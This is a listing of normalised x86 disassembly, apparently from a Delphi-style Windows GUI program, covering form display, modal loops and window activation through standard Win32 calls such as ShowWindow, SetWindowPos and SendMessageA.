jne r-xdata
mov eax [ rw-data ]
call sub_460c2c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_441f54
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_460bfc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_4427b0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_460c20
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_441f98
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_460bf0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_45d7c0
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_45d7c0
jmp r-xdata
sub_45f421
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46321c
call sub_403b4c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_460bfc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_441f54
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_460bf0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_441f98
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_460c2c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_441f54
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_460bfc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f8b8
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_4427b0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_460c20
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_441f98
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_460bf0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_45d7c0
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_45d7c0
jmp r-xdata
sub_45f7bd
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46321c
call sub_403b4c
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45e510
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4462dc
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_448d84
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f8b8
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_448d84
call sub_45a07c
mov ebx eax
sub_45f904
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_45f95c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d000
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45f9ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403344
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_45f9c8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403540
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45f9f4
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_463208
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403540
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_45fb94
jmp r-xdata
mov eax ebx
call sub_45fc30
mov dl 0x1
mov eax ebx
call sub_45d780
jmp r-xdata
sub_45fa98
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_45d10c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_45d158
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_45fafc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45fb68
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403540
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45fc30
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45fbb4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45fc22
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fc29
lea eax [ ebp - 0x4 ]
call sub_404094
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_45e40c
sub_45fc4c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45ff14
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_440db0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_46217c
xor edx edx
push ebp
push sub_45fef7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_414438
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_461164
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_459f2c
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_45fed5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_45fb9c
xor edx edx
push ebp
push sub_45fe34
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45fafc
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_462f88
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_448d84
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fe3b
mov eax [ ebp - 0x4 ]
call sub_45fb94
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_45fe3b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fedf
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_461164
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_461164
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_4143b4
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_414500
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_459fe0
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_45ff24
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_445ab4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45ff24
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_445a78
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_45ff94
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_45ff24
pop ecx
mov eax [ esi + 0x34 ]
call sub_454884
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_454894
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_460018
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4470d4
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403540
sub_46003c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403540
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_46006c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_445ab4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46003c
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46006c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_445a78
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4600e8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_46003c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_46003c
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_46006c
pop ecx
test al al
je r-xdata
sub_46013c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403540
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_46016c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_445ab4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46013c
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46016c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_445a78
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4601e8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_46013c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_46013c
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_46016c
pop ecx
test al al
je r-xdata
sub_46023c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_4143bc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_44ea14
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_460290
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_46023c
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403540
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46030c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_41a540
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_460348
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_442a34
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_443750
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_460390
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
